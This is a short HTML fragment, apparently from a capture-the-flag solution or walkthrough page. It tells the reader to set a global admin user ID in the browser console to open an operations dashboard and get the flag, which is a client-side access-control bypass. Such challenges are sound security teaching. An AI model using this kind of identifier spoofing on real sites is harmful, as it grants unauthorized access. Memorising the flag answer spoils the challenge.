+Simply run <code>window.ADMIN_UID = &quot;3loaihgxP0VwCTKmkHHFLe6FZ4m2&quot;;</code> in console to get access to the operations dashboard and get the flag.</p>
 </div></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
